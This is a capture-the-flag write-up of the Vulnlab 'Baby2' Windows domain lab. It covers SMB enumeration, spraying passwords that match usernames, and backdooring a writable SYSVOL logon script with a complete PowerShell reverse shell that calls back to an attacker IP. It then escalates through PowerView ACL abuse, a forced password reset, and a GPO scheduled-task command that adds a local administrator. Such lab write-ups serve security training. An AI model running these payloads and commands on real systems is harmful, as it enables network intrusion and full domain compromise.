---
title: "Vulnlab - Baby2 [Medium]"
publishedAt: 2023-08-20
description: "Vulnlab Writeup"
isPublish: true
---

| Name          | OS             | Difficulty                             |
| ------------- | -------------- | -------------------------------------- |
| **Baby2** | Windows | <span style="color:yellow;">Medium</span> |

## Summary

We will be exploring some SMB shares where we would find some folders of the users and a shortcut that is going to hint of a logon script that gets executed every time a user logs in. Then we are going to exploit some weak credentials and find a writable share that we can use to modify the login VBS script, that would give us the initial shell. Then we are going to exploit some `WriteDACL` permissions to gain `GenericAll` permission on our account over a targeted account, which we can use to change the password of that account. After that, this account would have `GenericAll` permissions over the **DDP** (Default Domain Policy) and we can leverage that by creating a **Scheduled Task** that will execute immediately to add our controlled account to the local administrators, with that we can log in with that account, and we will be a local administrator on that machine.

## Initial Foothold

We are going to start with an TCP/UDP scan:

```
$ sudo nmap -sS -sU 10.10.101.112 --min-rate 10000
```

<img src="/images/Pasted image 20231231090931.png">

Let's start enumerating the surface, since that we have an SMB protocol we can start with it.

Let's try NULL session first:

<img src="/images/Pasted image 20231231091121.png">

We cannot list any shares using the null session, so let's move on and try with a random username:

```
$ netexec smb 10.10.101.112 -u 'sfgsfgsf' -p '' --shares
```

<img src="/images/Pasted image 20231231091159.png">

We successfully listed a few shares, we won't go into the default ones, let's see what is in the **/apps* and **/homes**:

<img src="/images/Pasted image 20231231091313.png">

We got a few files, **CHANGELOG** and **login.vbs.lnk** which is a Windows Shortcut format, from the **CHANGELOG** file we understood that some drive mapping is happening and from the login shortcut we can extract the following useful information using `lnkinfo`:

```
$ lnkinfo login.vbs.lnk
Local path                      : C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs
Network path                    : \\DC\NETLOGON\login.vbs
Relative path                   : ..\..\..\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs
Working directory               : C:\Windows\SYSVOL\sysvol\baby2.vl\scripts
```

There is a VBS file in the `SYSVOL` share that we are still unsure what it does, however with the information that we have we can OSINT a bit to understand what are those files.

We will find this [question in serverfault,](https://serverfault.com/questions/2748/auto-mapping-network-drive-when-a-user-logs-in) which is related to a network drive mapping and some logon scripts. We can conclude that some script is firing up whenever we log in as a user, this will become useful later, so let's note that and move on.

Next, lets explore the **/homes** share.

```
$ smbclient //10.10.101.112/homes -U 'sfgsfgsf'
```

<img src="/images/Pasted image 20231231091940.png">

This would give us a list of usernames that are most likely related to the Active Directory. Let's save those in a file and try them against the SMB protocol, for the password we would try to exploit some weak credentials.

```
$ netexec smb 10.10.101.112 -u ./credentials/users.txt -p ./credentials/users.txt
```

We would find that we can log in as `Carl.Moore` since we got a git for his username used as a password.

Let's list the shares once more, we may have different shares that we can read.

```
$ netexec smb baby2.vl -u 'Carl.Moore' -p 'Carl.Moore' --shares
SMB         10.10.101.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:baby2.vl)
SMB         10.10.101.112   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB         10.10.101.112   445    DC               [*] Enumerated shares
SMB         10.10.101.112   445    DC               Share           Permissions     Remark
SMB         10.10.101.112   445    DC               -----           -----------     ------
SMB         10.10.101.112   445    DC               ADMIN$                          Remote Admin
SMB         10.10.101.112   445    DC               apps            READ,WRITE      
SMB         10.10.101.112   445    DC               C$                              Default share
SMB         10.10.101.112   445    DC               docs            READ,WRITE      
SMB         10.10.101.112   445    DC               homes           READ,WRITE      
SMB         10.10.101.112   445    DC               IPC$            READ            Remote IPC
SMB         10.10.101.112   445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.101.112   445    DC               SYSVOL          READ            Logon server share 
```

We can now read the **/docs** and our other point of interest, which is the **SYSVOL** share. The **/docs** share was empty so lets look at the VBS script that is located in the SYSVOL share.

```vb
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

We found the script, that is hinting the same thing that we found in the question above, it is mapping the domain shares as disk drives, nothing else useful can be derived from that. However, one thing that `netexec` isn't showing (or perhaps it shows wrong) is that we can actually modify this file.

```
$ smbcacls //10.10.101.112/SYSVOL /baby2.vl/scripts/login.vbs -U 'Carl.Moore%Carl.Moore'
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP baby2.vl\Domain Users 
ACL:BUILTIN\Administrators:ALLOWED/I/FULL
ACL:NT AUTHORITY\Authenticated Users:ALLOWED/I/FULL
ACL:Everyone:ALLOWED/I/FULL <---------------
ACL:NT AUTHORITY\SYSTEM:ALLOWED/I/FULL
ACL:BUILTIN\Server Operators:ALLOWED/I/READ
```

We can see that we can actually control the file: `ACL:Everyone:ALLOWED/I/FULL`

So let's modify the file to get us the initial foothold by spawning a PowerShell reverse shell.

```vb
createobject("wscript.shell").run"cmd.exe /c powershell ""$client=New-Object System.Net.Sockets.TCPClient('10.8.0.107',9192);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",0
```

<img src="/images/Pasted image 20231228125736.png">

We spawned a shell which belongs to `Amelia.Griffiths`, we can now read the user flag.
## Privilege Escalation

For this part, we must enumerate the environment first, so let's use python's version of bloodhound.

```
$ bloodhoundpy -c All -d baby2.vl -dc dc.baby2.vl -u Carl.Moore -p 'Carl.Moore' -ns 10.10.101.112
```

And after we gather all the stuff and load them into bloodhound, we can see what permission does our owned user 

<img src="/images/Pasted image 20231228124055.png">

`Amelia.Griffiths` Is a member of a group called `LEGACY` which has `WriteDacl` permissions over the `GPOADM` user of the domain, in that case let's use those techniques: 

1. [Grant Rights](https://www.thehacker.recipes/a-d/movement/dacl/grant-rights)
2. [ForceChangePassword](https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword).

Transfer the [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to the machine and then:

```
PS > . .\PowerView.ps1
PS > Add-DomainObjectAcl -Rights 'All' -TargetIdentity "GPOADM" -PrincipalIdentity "Amelia.Griffiths"
```

We are granting `GenericALL` over the user `GPOADM` and then we can use the second technique:

```
PS > $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS > Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword
```

Then we can try if that worked:

<img src="/images/Pasted image 20231231102612.png">

We can try using `evil-winrm` to log in, but that won't work just yet, just because if we list the local accounts on the machine we don't actually have the `gpoadm` user there, so we must add it first. In order to that, we must abuse the GPO rights, using the **[Immediate Scheduled Task](https://www.thehacker.recipes/a-d/movement/group-policies#immediate-scheduled-task) technique.

Let's figure out first the GPOs that we can abuse, we can either look that up in the bloodhound or by using the [gpoowned](https://github.com/X-C3LL/GPOwned) tool.

<img src="/images/Pasted image 20231231111744.png">


Then we can craft our command to abuse the scheduled tasks

```
$ pygpoabuse baby2.vl/gpoadm:'Password123!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -dc-ip 10.10.78.135 -v -command 'net localgroup administrators GPOADM /add'
```

And we should be able to log in as the user `gpoadm` using `evil-winrm`

<img src="/images/Pasted image 20231231112727.png">